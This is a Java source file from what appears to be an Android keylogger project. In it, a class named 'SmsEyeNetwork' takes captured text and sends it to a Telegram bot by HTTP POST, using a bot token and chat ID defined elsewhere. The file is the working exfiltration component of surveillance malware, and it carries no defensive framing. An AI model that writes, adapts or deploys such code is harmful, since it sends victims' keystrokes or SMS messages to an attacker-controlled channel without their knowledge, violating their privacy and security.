package com.bshu2.androidkeylogger;

import android.content.Context;
import android.util.Log;

import com.example.sample.Constants;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class SmsEyeNetwork {
    private final Context context;

    public SmsEyeNetwork(Context context) {
        this.context = context;
    }

    public void sendTextMessage(String message) {
        new Thread(() -> {
            try {
                String botToken = Constants.TELEGRAM_BOT_TOKEN; // Define in Constants
                String chatId = Constants.TELEGRAM_CHAT_ID;
                String apiUrl = "https://api.telegram.org/bot" + botToken + "/sendMessage";

                String postData = "chat_id=" + chatId + "&text=" + message.replace(" ", "+");

                URL url = new URL(apiUrl);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
                conn.setDoOutput(true);

                try (OutputStream os = conn.getOutputStream()) {
                    os.write(postData.getBytes("UTF-8"));
                    os.flush();
                }

                Log.d("SmsEyeNetwork", "Response Code: " + conn.getResponseCode());

            } catch (Exception e) {
                Log.e("SmsEyeNetwork", "Error sending message: " + e.getMessage(), e);
            }
        }).start();
    }
}
